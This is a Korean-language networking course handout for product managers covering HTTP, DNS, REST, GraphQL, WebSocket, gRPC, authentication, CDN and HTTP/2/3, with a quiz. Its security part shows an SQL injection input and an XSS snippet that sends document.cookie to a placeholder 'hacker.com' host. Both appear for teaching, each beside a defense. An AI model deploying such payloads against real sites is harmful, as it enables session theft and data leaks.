# Week 16: 네트워크 기초 상세 강의 자료

## 📚 학습 목표 (상세)
1. **네트워크 기본 개념** 이해 (IP, DNS, HTTP/HTTPS)
2. **PM이 알아야 할 네트워크 용어** 30개 습득
3. **API 및 REST** 기초 이해
4. **네트워크 보안** 기초 (HTTPS, 인증, 인가)
5. **웹 아키텍처** 이해 (클라이언트-서버, CDN)
6. **네트워크 성능** 최적화 기본

---

## 🌐 Part 1: 네트워크 기초

### 1.1 인터넷은 어떻게 작동하는가?

#### 비유로 이해하기

**우편 시스템과 인터넷**:
```
우편:
- 주소: 서울시 강남구 xxx
- 우체국: 라우터
- 우편물: 데이터 패킷

인터넷:
- IP 주소: 192.168.0.1
- 라우터: 데이터 전송 장치
- 패킷: 작은 데이터 조각
```

#### 웹페이지가 로드되는 과정

```
1. 주소 입력
   사용자: www.example.com 입력
   
2. DNS 조회
   DNS 서버: "example.com = 93.184.216.34"
   
3. 서버 연결
   브라우저 → 서버 IP로 연결 요청
   
4. 데이터 요청
   브라우저: "index.html 주세요"
   
5. 데이터 수신
   서버 → HTML, CSS, JS 전송
   
6. 화면 렌더링
   브라우저: 페이지 표시
```

**시간**:
```
총 소요 시간: 약 100-500ms
- DNS 조회: 20-120ms
- 연결: 20-100ms
- 데이터 전송: 50-200ms
- 렌더링: 10-80ms
```

### 1.2 핵심 프로토콜

#### HTTP (HyperText Transfer Protocol)

**요청-응답 모델**:
```
클라이언트 → 서버
GET /index.html HTTP/1.1
Host: www.example.com

서버 → 클라이언트
HTTP/1.1 200 OK
Content-Type: text/html

<html>...</html>
```

**HTTP 메서드**:
```
GET: 데이터 조회
POST: 데이터 생성
PUT: 데이터 수정 (전체)
PATCH: 데이터 수정 (일부)
DELETE: 데이터 삭제
```

**HTTP 상태 코드**:
```
2xx (성공)
- 200 OK: 성공
- 201 Created: 생성 성공

3xx (리다이렉트)
- 301 Moved Permanently: 영구 이동
- 302 Found: 임시 이동

4xx (클라이언트 오류)
- 400 Bad Request: 잘못된 요청
- 401 Unauthorized: 인증 필요
- 403 Forbidden: 권한 없음
- 404 Not Found: 찾을 수 없음

5xx (서버 오류)
- 500 Internal Server Error: 서버 오류
- 503 Service Unavailable: 서비스 불가
```

#### HTTPS (HTTP Secure)

**HTTP vs HTTPS**:
```
HTTP:
❌ 평문 전송 (누구나 볼 수 있음)
❌ 중간자 공격 가능
❌ 데이터 변조 가능

HTTPS:
✅ 암호화 전송
✅ 서버 인증
✅ 데이터 무결성
```

**SSL/TLS 인증서**:
```
역할:
1. 암호화
2. 서버 신원 확인
3. 데이터 무결성

발급:
- Let's Encrypt (무료)
- Comodo, DigiCert (유료)

주의:
- 만료 전 갱신 필요
- 모든 페이지에 HTTPS 적용
```

### 1.3 IP 주소와 DNS

#### IP 주소

**IPv4**:
```
형식: 192.168.0.1
- 4개 숫자 (0-255)
- 점(.)으로 구분
- 약 43억 개 주소
```

**IPv6**:
```
형식: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
- 16진수
- 콜론(:)으로 구분
- 거의 무한대 주소
```

**사설 IP vs 공인 IP**:
```
사설 IP:
- 192.168.x.x
- 10.x.x.x
- 내부 네트워크 전용

공인 IP:
- 인터넷에서 접근 가능
- 전세계 고유
- ISP가 할당
```

#### DNS (Domain Name System)

**도메인 구조**:
```
www.example.com

com: TLD (Top-Level Domain)
example: 2nd Level Domain
www: Subdomain
```

**DNS 레코드 타입**:
```
A 레코드: 도메인 → IPv4
AAAA 레코드: 도메인 → IPv6
CNAME: 별칭
MX: 메일 서버
TXT: 텍스트 정보 (SPF, DKIM)
```

---

## 🔌 Part 2: API 기초

### 2.1 API란?

**정의**: Application Programming Interface

**비유**:
```
식당에서:
- 손님: 클라이언트
- 웨이터: API
- 주방: 서버

손님이 직접 주방에 가지 않고
웨이터(API)를 통해 주문
```

**API의 역할**:
```
✅ 프로그램 간 통신
✅ 데이터 교환
✅ 기능 공유
✅ 통합 간소화
```

### 2.2 REST API

#### REST (REpresentational State Transfer)

**원칙**:
```
1. 자원(Resource): URL로 표현
2. 동작(Verb): HTTP 메서드
3. 표현(Representation): JSON, XML

예:
GET /users/123
→ 123번 사용자 정보 조회
```

#### REST API 설계

**좋은 예**:
```
GET    /users          모든 사용자 조회
GET    /users/123      123번 사용자 조회
POST   /users          사용자 생성
PUT    /users/123      123번 사용자 수정
DELETE /users/123      123번 사용자 삭제

GET    /users/123/orders  123번 사용자의 주문 목록
```

**나쁜 예**:
```
GET    /getUsers
POST   /createUser
GET    /deleteUser?id=123  ← 삭제에 GET 사용
POST   /users/123/delete   ← URL에 동사
```

#### API 요청/응답 예시

**요청**:
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer abc123token

{
  "name": "김철수",
  "email": "kim@example.com",
  "age": 30
}
```

**응답**:
```http
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": 456,
  "name": "김철수",
  "email": "kim@example.com",
  "age": 30,
  "created_at": "2024-01-15T10:30:00Z"
}
```

### 2.3 GraphQL

**REST vs GraphQL**:
```
REST:
GET /users/123
GET /users/123/posts
GET /users/123/friends
→ 3번 요청

GraphQL:
query {
  user(id: 123) {
    name
    posts { title }
    friends { name }
  }
}
→ 1번 요청
```

**장단점**:
```
GraphQL 장점:
✅ 필요한 데이터만 요청
✅ 단일 요청으로 다중 리소스
✅ 강력한 타입 시스템

GraphQL 단점:
❌ 학습 곡선
❌ 캐싱 복잡
❌ 파일 업로드 어려움
```

### 2.4 API 문서화

**Swagger/OpenAPI 예시**:
```yaml
paths:
  /users:
    get:
      summary: Get all users
      responses:
        200:
          description: Success
          schema:
            type: array
            items:
              $ref: '#/definitions/User'
              
definitions:
  User:
    type: object
    properties:
      id:
        type: integer
      name:
        type: string
      email:
        type: string
```

---

## 🔐 Part 3: 네트워크 보안

### 3.1 인증 vs 인가

**인증 (Authentication)**:
```
질문: "당신은 누구인가?"
방법: 로그인 (아이디 + 비밀번호)
예: "나는 김철수입니다"
```

**인가 (Authorization)**:
```
질문: "무엇을 할 수 있는가?"
방법: 권한 확인
예: "김철수는 관리자 페이지 접근 가능"
```

### 3.2 인증 방법

#### 세션 기반

```
1. 로그인
   클라이언트 → 서버
   POST /login {username, password}

2. 세션 생성
   서버: 세션 ID 생성 및 저장
   
3. 쿠키 전송
   서버 → 클라이언트
   Set-Cookie: sessionId=abc123
   
4. 이후 요청
   클라이언트 → 서버
   Cookie: sessionId=abc123
   
5. 세션 검증
   서버: 세션 ID로 사용자 확인
```

**장단점**:
```
장점:
✅ 서버에서 제어 가능
✅ 로그아웃 즉시 반영

단점:
❌ 서버 부하 (세션 저장)
❌ 확장성 제한
```

#### 토큰 기반 (JWT)

**JWT (JSON Web Token)**:
```
구조:
Header.Payload.Signature

예:
eyJhbGci.eyJ1c2Vy.SflKxwRJ

Payload 내용:
{
  "userId": 123,
  "name": "김철수",
  "exp": 1640000000
}
```

**흐름**:
```
1. 로그인
   클라이언트 → 서버
   
2. 토큰 발급
   서버 → 클라이언트
   JWT 토큰 생성 및 전송
   
3. 이후 요청
   클라이언트 → 서버
   Authorization: Bearer <token>
   
4. 토큰 검증
   서버: 서명 검증
```

**장단점**:
```
장점:
✅ 서버 부하 낮음
✅ 확장성 좋음
✅ 모바일 친화적

단점:
❌ 토큰 탈취 위험
❌ 로그아웃 즉시 반영 어려움
```

### 3.3 보안 위협

#### HTTPS 필수

**중간자 공격 (MITM)**:
```
HTTP:
사용자 → [해커] → 서버
         ↑
      데이터 탈취

HTTPS:
사용자 → [해커] → 서버
      (암호화된 데이터)
```

#### SQL Injection

**취약한 코드**:
```sql
query = "SELECT * FROM users WHERE id = " + userId;

공격:
userId = "1 OR 1=1"
결과: 모든 사용자 정보 유출
```

**안전한 코드**:
```sql
query = "SELECT * FROM users WHERE id = ?"
params = [userId]
```

#### XSS (Cross-Site Scripting)

**공격**:
```html
댓글 입력:
<script>
  // 쿠키 탈취
  fetch('http://hacker.com?cookie=' + document.cookie)
</script>
```

**방어**:
```javascript
// 입력 검증 및 이스케이프
const sanitized = escapeHtml(userInput);
```

---

## 📊 Part 4: 성능 최적화

### 4.1 레이턴시와 처리량

**레이턴시 (Latency)**:
```
정의: 요청부터 응답까지 시간
단위: ms (밀리초)

목표:
- 웹: < 200ms
- API: < 100ms
- 실시간: < 50ms
```

**처리량 (Throughput)**:
```
정의: 단위 시간당 처리량
단위: req/s (초당 요청 수)

목표:
- 소규모: 100 req/s
- 중규모: 1,000 req/s
- 대규모: 10,000+ req/s
```

### 4.2 CDN (Content Delivery Network)

**CDN 없이**:
```
한국 사용자 → 미국 서버
왕복 시간: 200ms
```

**CDN 사용**:
```
한국 사용자 → 한국 CDN
왕복 시간: 20ms
→ 10배 빠름!
```

**동작 원리**:
```
1. 사용자 요청
2. 가장 가까운 CDN 서버
3. 캐시 확인
   - 있으면: 즉시 응답
   - 없으면: 원본 서버에서 가져와 캐시
```

### 4.3 로드 밸런서

**역할**:
```
사용자 요청
     ↓
┌─────────────┐
│Load Balancer│
└─────────────┘
   /    |    \
  /     |     \
서버1  서버2  서버3
```

**알고리즘**:
```
Round Robin: 순서대로 분산
Least Connections: 연결 적은 서버
IP Hash: IP 기반 할당
```

---

## 📋 Part 5: PM이 알아야 할 네트워크 용어 30개

| 용어 | 설명 | PM 관점 |
|-----|------|---------|
| **IP** | 인터넷 주소 | 서버 식별 |
| **DNS** | 도메인 이름 시스템 | 도메인 관리 |
| **HTTP/HTTPS** | 웹 프로토콜 | 보안 필수 |
| **API** | 프로그램 간 통신 | 통합 핵심 |
| **REST** | API 설계 방식 | 표준 규약 |
| **JSON** | 데이터 형식 | API 응답 |
| **SSL/TLS** | 암호화 프로토콜 | 보안 인증서 |
| **쿠키** | 브라우저 저장 데이터 | 세션 유지 |
| **세션** | 로그인 상태 유지 | 인증 관리 |
| **토큰** | 인증 정보 | JWT 활용 |
| **방화벽** | 네트워크 보안 | 접근 통제 |
| **VPN** | 가상 사설망 | 원격 접속 |
| **CDN** | 콘텐츠 전송 네트워크 | 성능 향상 |
| **로드 밸런서** | 트래픽 분산 | 고가용성 |
| **대역폭** | 전송 용량 | 비용 관리 |
| **레이턴시** | 응답 시간 | 사용자 경험 |
| **처리량** | 초당 요청 수 | 용량 계획 |
| **패킷** | 데이터 단위 | 전송 이해 |
| **포트** | 서비스 구분 | 80, 443 |
| **프록시** | 중계 서버 | 보안, 캐싱 |
| **캐시** | 임시 저장 | 성능 개선 |
| **WebSocket** | 양방향 통신 | 실시간 기능 |
| **OAuth** | 인증 프로토콜 | SNS 로그인 |
| **CORS** | 교차 출처 요청 | API 보안 |
| **Webhook** | 이벤트 알림 | 자동화 |
| **NAT** | 주소 변환 | 사설 IP |
| **Subnet** | 네트워크 분할 | 보안 구분 |
| **Gateway** | 네트워크 출입구 | 라우팅 |
| **Ping** | 연결 확인 | 장애 진단 |
| **Traceroute** | 경로 추적 | 네트워크 분석 |

---

## 💼 6. 실습 과제

### 과제 1: API 테스트

**도구**: Postman 또는 curl

**과제**:
1. 공개 API 선택 (예: JSONPlaceholder)
2. 5개 요청 실행:
   - GET: 목록 조회
   - GET: 단일 항목
   - POST: 생성
   - PUT: 수정
   - DELETE: 삭제
3. 응답 분석

**제출물**:
- 요청/응답 스크린샷
- 상태 코드 정리

### 과제 2: 네트워크 진단

**도구**: 
- ping
- traceroute
- nslookup

**과제**:
1. 3개 웹사이트 진단
2. 응답 시간 비교
3. 경로 분석

**제출물**:
- 진단 결과 정리 (1페이지)

### 과제 3: API 설계

**시나리오**: 블로그 시스템

**요구사항**:
- 게시물 CRUD
- 댓글 기능
- 사용자 인증

**과제**:
REST API 엔드포인트 설계

**제출물**:
- API 명세서 (2페이지)

**제출물**:
- API 명세서 (2페이지)

---

## 🚀 8. 고급 API 패턴

### 8.1 GraphQL

#### REST vs GraphQL

**REST API 문제점**:
```
시나리오: 사용자 프로필 + 게시글 + 댓글 조회

REST (3번 요청):
GET /users/123
GET /users/123/posts
GET /posts/456/comments

문제:
- Over-fetching: 불필요한 데이터까지 받음
- Under-fetching: 여러 번 요청 필요
- N+1 문제
```

**GraphQL (1번 요청)**:
```graphql
query {
  user(id: 123) {
    name
    email
    posts {
      title
      comments {
        author
        text
      }
    }
  }
}

장점:
- 필요한 데이터만 요청
- 단일 엔드포인트
- 강력한 타입 시스템
```

#### GraphQL 쿼리 예시

**쿼리 (Query) - 데이터 조회**:
```graphql
# 특정 사용자 조회
query GetUser {
  user(id: "123") {
    id
    name
    email
    posts(limit: 5) {
      title
      createdAt
    }
  }
}

# 응답
{
  "data": {
    "user": {
      "id": "123",
      "name": "김철수",
      "email": "kim@example.com",
      "posts": [
        {
          "title": "첫 번째 게시글",
          "createdAt": "2024-01-01"
        }
      ]
    }
  }
}
```

**뮤테이션 (Mutation) - 데이터 변경**:
```graphql
mutation CreatePost {
  createPost(
    title: "새 게시글"
    content: "내용..."
  ) {
    id
    title
    createdAt
  }
}
```

**구독 (Subscription) - 실시간 데이터**:
```graphql
subscription OnNewPost {
  postCreated {
    id
    title
    author {
      name
    }
  }
}
```

#### PM 관점의 GraphQL

**언제 사용하면 좋을까?**:
- ✅ 모바일 앱 (데이터 효율 중요)
- ✅ 복잡한 데이터 관계
- ✅ 빠른 프로토타이핑
- ✅ 여러 클라이언트 (웹, 모바일, IoT)

**언제 사용하지 말아야 할까?**:
- ❌ 단순한 CRUD 작업
- ❌ 파일 업로드/다운로드
- ❌ 캐싱이 중요한 경우
- ❌ 팀의 학습 곡선 고려

### 8.2 WebSocket

#### HTTP vs WebSocket

**HTTP (Request-Response)**:
```
클라이언트 → 서버: 요청
서버 → 클라이언트: 응답
(연결 종료)

다시 데이터 필요:
클라이언트 → 서버: 새 요청
서버 → 클라이언트: 응답
```

**WebSocket (Full-Duplex)**:
```
클라이언트 ↔ 서버: 연결 유지
클라이언트 → 서버: 메시지
서버 → 클라이언트: 메시지
서버 → 클라이언트: 메시지 (Push)
(연결 계속 유지)
```

#### WebSocket 활용 사례

**1. 실시간 채팅**:
```javascript
// 클라이언트
const ws = new WebSocket('wss://chat.example.com');

// 연결 성공
ws.onopen = () => {
  console.log('Connected');
  ws.send(JSON.stringify({
    type: 'join',
    room: 'general'
  }));
};

// 메시지 수신
ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  displayMessage(message);
};

// 메시지 전송
function sendMessage(text) {
  ws.send(JSON.stringify({
    type: 'message',
    text: text
  }));
}
```

**2. 실시간 대시보드**:
```
서버 → 클라이언트 (주기적 Push)
{
  "type": "metrics",
  "cpu": 45,
  "memory": 78,
  "requests": 1234
}
```

**3. 협업 도구** (Google Docs 스타일):
```
사용자 A → 서버 → 사용자 B, C
{
  "type": "edit",
  "position": 123,
  "text": "Hello"
}
```

#### WebSocket vs Polling

**Short Polling**:
```javascript
// 1초마다 요청
setInterval(() => {
  fetch('/api/messages')
    .then(res => res.json())
    .then(data => updateUI(data));
}, 1000);

문제:
- 서버 부하 높음 (불필요한 요청)
- 지연 시간 (최대 1초)
- 대역폭 낭비
```

**Long Polling**:
```javascript
function poll() {
  fetch('/api/messages')
    .then(res => res.json())
    .then(data => {
      updateUI(data);
      poll(); // 다시 요청
    });
}

개선:
- 데이터 있을 때만 응답
- 지연 시간 감소

문제:
- 여전히 HTTP 오버헤드
```

**WebSocket (Best)**:
```javascript
const ws = new WebSocket('wss://api.example.com');
ws.onmessage = (event) => {
  updateUI(JSON.parse(event.data));
};

장점:
- 실시간 (지연 최소)
- 서버 Push 가능
- 오버헤드 낮음
- 양방향 통신
```

### 8.3 gRPC

#### gRPC란?

**정의**:
- Google이 개발한 RPC (Remote Procedure Call) 프레임워크
- Protocol Buffers (Protobuf) 사용
- HTTP/2 기반

**특징**:
```
REST:
- 텍스트 기반 (JSON)
- 사람이 읽기 쉬움
- 크기 큼

gRPC:
- 바이너리 (Protobuf)
- 사람이 읽기 어려움
- 크기 작음 (20-50% 절감)
- 빠름 (5-10배)
```

#### Protocol Buffers 예시

**user.proto (정의)**:
```protobuf
syntax = "proto3";

message User {
  int32 id = 1;
  string name = 2;
  string email = 3;
  repeated Post posts = 4;
}

message Post {
  int32 id = 1;
  string title = 2;
  string content = 3;
}

service UserService {
  rpc GetUser (UserRequest) returns (User);
  rpc CreateUser (CreateUserRequest) returns (User);
  rpc ListUsers (Empty) returns (stream User);
}
```

#### gRPC vs REST

**장점**:
- ✅ 높은 성능 (바이너리, HTTP/2)
- ✅ 강력한 타입 (컴파일 타임 체크)
- ✅ 스트리밍 지원
- ✅ 다국어 클라이언트 자동 생성

**단점**:
- ❌ 브라우저 직접 호출 어려움
- ❌ 사람이 읽기 어려움
- ❌ 학습 곡선 높음
- ❌ REST만큼 보편적이지 않음

**적용 사례**:
- 🎯 마이크로서비스 간 통신
- 🎯 모바일 앱 ↔ 백엔드
- 🎯 IoT 디바이스
- 🎯  스트리밍 서비스

---

## 🌐 9. 마이크로서비스 네트워킹

### 9.1 서비스 간 통신

#### 동기 vs 비동기

**동기 통신 (Synchronous)**:
```
[Service A] → [Service B]
            ← 응답 대기 (블로킹)
            ← 응답
계속 진행

예: REST API, gRPC

장점: 간단, 즉시 결과
단점: 결합도 높음, 장애 전파
```

**비동기 통신 (Asynchronous)**:
```
[Service A] → [Message Queue]
              [Service B] ← 처리 (독립적)
              
예: RabbitMQ, Kafka, AWS SQS

장점: 결합도 낮음, 장애 격리
단점: 복잡도 증가, 최종 일관성
```

#### 메시지 큐 패턴

**1. Point-to-Point**:
```
[Producer] → [Queue] → [Consumer]

예: 주문 처리
주문 서비스 → [주문 큐] → 결제 서비스
```

**2. Publish-Subscribe**:
```
[Publisher] → [Topic]
                ├→ [Subscriber 1]
                ├→ [Subscriber 2]
                └→ [Subscriber 3]

예: 이벤트 알림
주문 완료 → [이벤트 버스]
              ├→ 이메일 서비스
              ├→ SMS 서비스
              └→ 로그 서비스
```

#### Circuit Breaker 패턴

**문제 상황**:
```
[Service A] → [Service B] (장애)
              ↑ Timeout (30초)
              ↑ Retry (3회)
              ↑ 총 90초 대기...
              
→ Service A도 느려짐 (Cascading Failure)
```

**Circuit Breaker 적용**:
```
[Service A] → [Circuit Breaker] → [Service B]

상태:
1. Closed (정상)
   → 요청 통과
   
2. Open (장애 감지)
   → 즉시 실패 반환 (빠른 실패)
   → Service A 보호
   
3. Half-Open (회복 테스트)
   → 일부 요청 허용
   → 성공 시 Closed
   → 실패 시 Open
```

**구현 예시 (Node.js)**:
```javascript
const CircuitBreaker = require('opossum');

const options = {
  timeout: 3000, // 3초 타임아웃
  errorThresholdPercentage: 50, // 50% 에러 시 오픈
  resetTimeout: 30000 // 30초 후 Half-Open
};

const breaker = new CircuitBreaker(callService, options);

// 폴백 처리
breaker.fallback(() => {
  return { cached: true, data: getCachedData() };
});

// 사용
breaker.fire(userId)
  .then(data => console.log(data))
  .catch(err => console.error(err));
```

### 9.2 Service Mesh

#### Service Mesh란?

**정의**:
- 마이크로서비스 간 통신을 관리하는 인프라 레이어
- 애플리케이션 코드와 분리
- Proxy (Sidecar) 패턴

**아키텍처**:
```
[Service A] ← [Proxy A] ↔ [Proxy B] → [Service B]
                ↕                ↕
            [Control Plane]
            (Istio, Linkerd)
```

**제공 기능**:
1. **트래픽 관리**:
   - 로드 밸런싱
   - Canary 배포
   - A/B 테스팅

2. **보안**:
   - mTLS (상호 인증)
   - 인증/인가
   - 암호화

3. **관찰성**:
   - 분산 트레이싱
   - 메트릭 수집
   - 로그 집계

#### Istio 예시

**Canary 배포 (10% 트래픽)**:
```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: reviews
spec:
  hosts:
    - reviews
  http:
  - match:
    - headers:
        end-user:
          exact: jason
    route:
    - destination:
        host: reviews
        subset: v2
  - route:
    - destination:
        host: reviews
        subset: v1
      weight: 90
    - destination:
        host: reviews
        subset: v2
      weight: 10
```

**PM이 알아야 할 것**:
- ✅ 마이크로서비스 통신 복잡도
- ✅ Service Mesh 도입 시점 (서비스 5-10개 이상)
- ✅ 학습 곡선 및 운영 비용
- ✅ 관찰성 개선 효과

---

## 📊 10. 네트워크 모니터링 및 최적화

### 10.1 주요 성능 지표

#### 1. Latency (지연 시간)

**정의**: 요청부터 응답까지 시간
```
구성 요소:
- DNS 조회: 20-120ms
- TCP 연결: 20-100ms
- TLS 핸드셰이크: 50-300ms (HTTPS)
- 서버 처리: 10-500ms
- 데이터 전송: 10-200ms
합계: 110-1220ms
```

**최적화 방법**:
1. **DNS Prefetch**:
```html
<link rel="dns-prefetch" href="//api.example.com">
```

2. **연결 재사용**:
```
HTTP/1.1: Keep-Alive
HTTP/2: 멀티플렉싱
```

3. **CDN 활용**:
```
사용자 (서울) → CDN (서울) [10ms]
vs
사용자 (서울) → 서버 (미국) [200ms]
```

#### 2. Throughput (처리량)

**정의**: 초당 처리 가능한 요청 수
```
측정:
- Requests per second (RPS)
- Transactions per second (TPS)

예:
- 웹 서버: 1,000 RPS
- DB: 10,000 TPS
```

**병목 지점 찾기**:
```
[로드 밸런서] (10,000 RPS)
      ↓
[웹 서버 x 5] (각 1,000 RPS = 5,000 RPS) ← 병목!
      ↓
[DB] (10,000 TPS)
```

**개선**:
- 웹 서버 증설 (5 → 10대)
- 캐싱 도입 (Redis)
- DB 쿼리 최적화

#### 3. Bandwidth (대역폭)

**정의**: 전송할 수 있는 데이터 양
```
측정:
- Mbps (Megabits per second)
- GB/월

예:
- 비디오 스트리밍: 5 Mbps
- 웹 페이지: 2 MB = 16 Mbps (1초 로딩)
```

**최적화**:
1. **이미지 압축**:
```
Before: image.jpg (5 MB)
After: image.webp (500 KB) ← 10배 절감
```

2. **Gzip/Brotli 압축**:
```
HTML/CSS/JS:
Before: 1 MB
After: 200 KB (80% 절감)
```

3. **Lazy Loading**:
```javascript
// 화면에 보이는 이미지만 로드
<img src="placeholder.jpg" data-src="real-image.jpg" loading="lazy">
```

### 10.2 CDN (Content Delivery Network)

#### CDN이란?

**정의**: 전 세계에 분산된 서버 네트워크
```
Origin Server (미국)
  └─ CDN Edge Servers
      ├─ 서울
      ├─ 도쿄
      ├─ 홍콩
      └─ 싱가포르

사용자 (서울) → CDN (서울) [빠름]
         vs
사용자 (서울) → Origin (미국) [느림]
```

**동작 원리**:
```
1. 사용자 요청
   사용자 → CDN (서울)

2. 캐시 확인
   캐시 있음 → 즉시 응답 (Cache Hit)
   캐시 없음 → Origin에서 가져오기 (Cache Miss)

3. 캐싱
   CDN에 저장 (다음 요청을 위해)
```

#### CDN 설정 예시

**CloudFront (AWS CDN)**:
```yaml
Distribution:
  Origins:
    - DomainName: myapp.s3.amazonaws.com
      Id: S3-myapp
  
  DefaultCacheBehavior:
    TargetOriginId: S3-myapp
    ViewerProtocolPolicy: redirect-to-https
    Compress: true
    CachePolicyId: CachingOptimized
    
  CachePolicy:
    MinTTL: 0
    MaxTTL: 31536000  # 1년
    DefaultTTL: 86400  # 1일
```

**Cache Control 헤더**:
```http
# 정적 파일 (이미지, CSS, JS)
Cache-Control: public, max-age=31536000, immutable

# 동적 콘텐츠 (HTML)
Cache-Control: public, max-age=300, must-revalidate

# 개인정보 (캐시 안 함)
Cache-Control: private, no-cache, no-store, must-revalidate
```

#### PM 의사결정

**CDN 도입 시점**:
- ✅ 글로벌 사용자
- ✅ 정적 콘텐츠 많음 (이미지, 비디오)
- ✅ 트래픽 증가

**비용 분석**:
```
시나리오: 월 1TB 트래픽

서버 직접 전송:
- 대역폭 비용: $90/TB
- 서버 부하 증가
합계: $90 + 서버 증설

CDN 사용:
- CloudFront: $85/TB
- 서버 부하 감소
합계: $85 (서버 절약)
```

### 10.3 HTTP/2 & HTTP/3

#### HTTP/1.1의 문제

**Head-of-Line Blocking**:
```
HTTP/1.1 (연결당 1개 요청):
[Request 1] → [Response 1]
              [Request 2] → [Response 2]
                            [Request 3] → [Response 3]

→ 순차 처리 (느림)
```

**해결책** (HTTP/1.1):
```
병렬 연결 (6개):
Connection 1: [Request 1]
Connection 2: [Request 2]
Connection 3: [Request 3]
...

→ 연결 오버헤드 증가
```

#### HTTP/2 개선

**멀티플렉싱 (Multiplexing)**:
```
HTTP/2 (1개 연결로 여러 요청):
[Connection]
  ├─ [Stream 1: Request 1 → Response 1]
  ├─ [Stream 2: Request 2 → Response 2]
  └─ [Stream 3: Request 3 → Response 3]

→ 동시 처리 (빠름)
```

**Server Push**:
```
클라이언트 → 서버: index.html 요청

서버 → 클라이언트:
- index.html
- style.css (Push)
- script.js (Push)

→ 추가 요청 없이 미리 전송
```

**헤더 압축 (HPACK)**:
```
HTTP/1.1:
Request 1: 500 bytes (헤더)
Request 2: 500 bytes (중복 헤더)
Request 3: 500 bytes (중복 헤더)

HTTP/2:
Request 1: 500 bytes
Request 2: 50 bytes (차이만)
Request 3: 50 bytes (차이만)
```

#### HTTP/3 (QUIC)

**주요 개선**:
```
HTTP/2 (TCP):
패킷 손실 → 전체 Stream 블로킹

HTTP/3 (QUIC/UDP):
패킷 손실 → 해당 Stream만 블로킹
→ 다른 Stream은 계속 진행
```

**0-RTT 연결**:
```
HTTP/2 (TLS 1.3):
1-RTT 또는 2-RTT 핸드셰이크

HTTP/3:
0-RTT (이전 연결 재개 시)
→ 즉시 데이터 전송
```

---

## 🎯 11. 자가 점검 퀴즈

### 객관식

**1. HTTP 상태 코드 404의 의미는?**
- A) 성공
- B) 서버 오류
- C) 찾을 수 없음
- D) 권한 없음

**정답**: C

---

**2. REST API에서 데이터 생성 시 사용하는 HTTP 메서드는?**
- A) GET
- B) POST
- C) PUT
- D) DELETE

**정답**: B

---

**3. JWT의 구성 요소가 아닌 것은?**
- A) Header
- B) Payload
- C) Session
- D) Signature

**정답**: C

---

**4. CDN의 주요 목적은?**
- A) 보안 강화
- B) 성능 향상
- C) 비용 절감
- D) 개발 효율

**정답**: B

---

**5. 인증(Authentication)과 인가(Authorization)의 차이는?**
- A) 같은 의미
- B) 인증은 신원 확인, 인가는 권한 확인
- C) 인가가 먼저
- D) 차이 없음

**정답**: B

---

### 서술형

**6. HTTP와 HTTPS의 차이를 보안 관점에서 설명하시오.**

**모범 답안**:
- **HTTP**: 평문 전송, 중간자 공격 취약
- **HTTPS**: SSL/TLS 암호화, 데이터 보호, 서버 인증

---

**7. REST API 설계 원칙 5가지를 나열하시오.**

**모범 답안**:
1. 자원은 명사로 표현
2. HTTP 메서드 활용 (GET, POST, PUT, DELETE)
3. 계층 구조 표현
4. 복수형 사용
5. 버전 관리

---

**8. 세션 기반 인증과 토큰 기반 인증의 장단점을 비교하시오.**

**모범 답안**:

**세션**:
- 장점: 서버 제어, 즉시 로그아웃
- 단점: 서버 부하, 확장성 제한

**토큰**:
- 장점: 서버 부하 낮음, 확장성
- 단점: 탈취 위험, 로그아웃 처리 어려움

---

**9. PM이 API 명세서를 검토할 때 확인해야 할 5가지 항목을 나열하시오.**

**모범 답안**:
1. 엔드포인트 명명 규칙
2. HTTP 메서드 적절성
3. 요청/응답 형식
4. 에러 처리
5. 인증/인가 방식

---

**10. 네트워크 성능 최적화 방법 5가지를 설명하시오.**

**모범 답안**:
1. **CDN 활용**: 지리적 근접성
2. **캐싱**: 반복 요청 감소
3. **압축**: gzip, Brotli
4. **로드 밸런싱**: 트래픽 분산
5. **HTTP/2**: 멀티플렉싱

---

## 📚 8. 핵심 용어 정리

| 한글 | 영문 | 설명 |
|-----|------|------|
| 프로토콜 | Protocol | 통신 규약 |
| 대역폭 | Bandwidth | 전송 용량 |
| 레이턴시 | Latency | 응답 시간 |
| 처리량 | Throughput | 초당 요청 |
| 패킷 | Packet | 데이터 단위 |
| 라우터 | Router | 경로 결정 장치 |
| 방화벽 | Firewall | 보안 장치 |
| 프록시 | Proxy | 중계 서버 |

---

## 🎓 과정 완료

**축하합니다!**

Week 1-16 모든 과정을 완료하셨습니다.

**다음 단계**:
1. 모의 프로젝트 복습
2. 실습 과제 완성
3. PM 자격증 준비 (PMP, CAPM)

---

**강의 자료 버전**: 1.0  
**최종 업데이트**: 2026년 1월  
**작성자**: PM Expert Training Team
